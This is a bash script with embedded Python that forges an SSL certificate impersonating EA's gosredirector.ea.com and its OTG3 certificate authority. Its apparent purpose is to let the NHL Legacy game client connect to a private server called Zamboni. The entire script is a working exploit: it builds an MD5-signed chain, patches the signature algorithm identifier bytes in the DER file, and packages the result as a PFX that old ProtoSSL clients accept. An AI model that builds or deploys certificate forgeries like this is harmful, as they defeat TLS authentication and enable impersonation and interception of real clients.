#!/bin/bash
# Script to create a fake SSL certificate using Bug_OldProtoSSL method
# for NHL Legacy (gosredirector.ea.com)
# Based on: https://github.com/Aim4kill/Bug_OldProtoSSL

set -e

# Configuration
CERT_DIR="certificates"
CA_NAME="OTG3"
CERT_NAME="gosredirector"
MOD_NAME="${CERT_NAME}_mod"
PASSWORD="password"

echo "=== Creating fake SSL certificate using Bug_OldProtoSSL method ==="
echo "This exploits a bug in older ProtoSSL clients to accept self-signed certificates"
echo ""

# Create certificates directory if it doesn't exist
mkdir -p "${CERT_DIR}"

# Check if OpenSSL is installed
if ! command -v openssl &> /dev/null; then
    echo "ERROR: OpenSSL is not installed. Please install OpenSSL first."
    echo "On Ubuntu/Debian: sudo apt-get install openssl"
    exit 1
fi

echo "Step 1: Creating Certificate Authority (CA)..."
# Create private key for CA
openssl genrsa -out "${CERT_DIR}/${CA_NAME}.key.pem" 1024

# Create the CA certificate (with MD5 signature - this is important!)
openssl req -new -md5 -x509 -days 28124 -key "${CERT_DIR}/${CA_NAME}.key.pem" \
    -out "${CERT_DIR}/${CA_NAME}.crt" \
    -subj "/OU=Online Technology Group/O=Electronic Arts, Inc./L=Redwood City/ST=California/C=US/CN=OTG3 Certificate Authority"

echo "Step 2: Creating server certificate..."
# Create private key for server certificate
openssl genrsa -out "${CERT_DIR}/${CERT_NAME}.key.pem" 1024

# Create certificate signing request
openssl req -new -key "${CERT_DIR}/${CERT_NAME}.key.pem" \
    -out "${CERT_DIR}/${CERT_NAME}.csr" \
    -subj "/CN=gosredirector.ea.com/OU=Global Online Studio/O=Electronic Arts, Inc./ST=California/C=US"

# Create the certificate signed by CA (using MD5 - critical!)
openssl x509 -req -in "${CERT_DIR}/${CERT_NAME}.csr" \
    -CA "${CERT_DIR}/${CA_NAME}.crt" \
    -CAkey "${CERT_DIR}/${CA_NAME}.key.pem" \
    -CAcreateserial \
    -out "${CERT_DIR}/${CERT_NAME}.crt" \
    -days 10000 \
    -md5

echo "Step 3: Exporting certificate to DER format for modification..."
# Export to DER format (binary format we can modify)
openssl x509 -outform der -in "${CERT_DIR}/${CERT_NAME}.crt" \
    -out "${CERT_DIR}/${CERT_NAME}.der"

echo ""
echo "Step 4: Modifying DER file to exploit ProtoSSL bug..."
echo "This changes the algorithmIdentifier from MD5 (0x04) to RSA_PKCS_KEY (0x01)"
echo "The pattern to find: 2a864886f70d010104 (MD5)"
echo "Change last byte to: 2a864886f70d010101 (RSA_PKCS_KEY)"

# Check if xxd (hexdump) is available
if ! command -v xxd &> /dev/null; then
    echo "ERROR: xxd is not installed. Please install it first."
    echo "On Ubuntu/Debian: sudo apt-get install xxd"
    exit 1
fi

# Create a copy for modification
cp "${CERT_DIR}/${CERT_NAME}.der" "${CERT_DIR}/${MOD_NAME}.der"

# Find all occurrences of MD5 pattern (2a864886f70d010104)
echo "Searching for MD5 algorithmIdentifier patterns..."
PATTERN="2a864886f70d010104"
OCCURRENCES=$(xxd -p "${CERT_DIR}/${MOD_NAME}.der" | tr -d '\n' | grep -o "$PATTERN" | wc -l)

if [ "$OCCURRENCES" -eq 0 ]; then
    echo "WARNING: Could not find MD5 pattern. The certificate may already use a different signature."
    echo "Proceeding with manual hex editing..."
elif [ "$OCCURRENCES" -ge 2 ]; then
    echo "Found $OCCURRENCES occurrences of MD5 pattern."
    echo "We need to modify the SECOND occurrence (algorithmIdentifier in signature section)."
    
    # Convert DER to hex, modify second occurrence, convert back
    # This is tricky - we'll use a Python script or sed
    if command -v python3 &> /dev/null; then
        python3 << EOF
import sys

with open('${CERT_DIR}/${MOD_NAME}.der', 'rb') as f:
    data = bytearray(f.read())

# Find all occurrences of the pattern: 2a 86 48 86 f7 0d 01 01 04
pattern = bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x04])
replace_with = bytes([0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01])

# Find the second occurrence
count = 0
index = -1
while True:
    index = data.find(pattern, index + 1)
    if index == -1:
        break
    count += 1
    if count == 2:
        # Found second occurrence - modify it
        data[index:index+len(pattern)] = replace_with
        print(f"Modified second occurrence at offset {index:04X} (decimal {index})")
        break

if count < 2:
    print(f"ERROR: Only found {count} occurrence(s), expected at least 2")
    sys.exit(1)

with open('${CERT_DIR}/${MOD_NAME}.der', 'wb') as f:
    f.write(data)
EOF
    else
        echo "ERROR: Python3 is required for automatic modification."
        echo "Please manually edit ${CERT_DIR}/${MOD_NAME}.der:"
        echo "  1. Open in hex editor"
        echo "  2. Find second occurrence of: 2a 86 48 86 f7 0d 01 01 04"
        echo "  3. Change last byte from 04 to 01"
        echo "  4. Save the file"
        exit 1
    fi
else
    echo "ERROR: Expected at least 2 occurrences, found only $OCCURRENCES"
    echo "The certificate may not be in the expected format."
    exit 1
fi

echo ""
echo "Step 5: Converting modified DER back to certificate format..."
# Convert modified DER back to PEM
openssl x509 -inform der -in "${CERT_DIR}/${MOD_NAME}.der" \
    -out "${CERT_DIR}/${MOD_NAME}.crt"

echo ""
echo "Step 6: Exporting as PFX (PKCS#12) for use in Zamboni..."
# Export as PFX with password
openssl pkcs12 -export \
    -out "${CERT_DIR}/${CERT_NAME}.pfx" \
    -inkey "${CERT_DIR}/${CERT_NAME}.key.pem" \
    -in "${CERT_DIR}/${MOD_NAME}.crt" \
    -passout "pass:${PASSWORD}"

echo ""
echo "=== Certificate creation complete! ==="
echo ""
echo "Generated files:"
echo "  - ${CERT_DIR}/${CERT_NAME}.pfx (use this in Zamboni)"
echo ""
echo "Certificate details:"
openssl pkcs12 -in "${CERT_DIR}/${CERT_NAME}.pfx" -nokeys -passin "pass:${PASSWORD}" | openssl x509 -noout -subject -issuer

echo ""
echo "This certificate should now be accepted by NHL Legacy without requiring"
echo "client-side SSL patches, thanks to the ProtoSSL bug exploit."
echo ""
echo "The certificate is already configured in Zamboni/Program.cs to load from:"
echo "  certificates/${CERT_NAME}.pfx"
echo ""

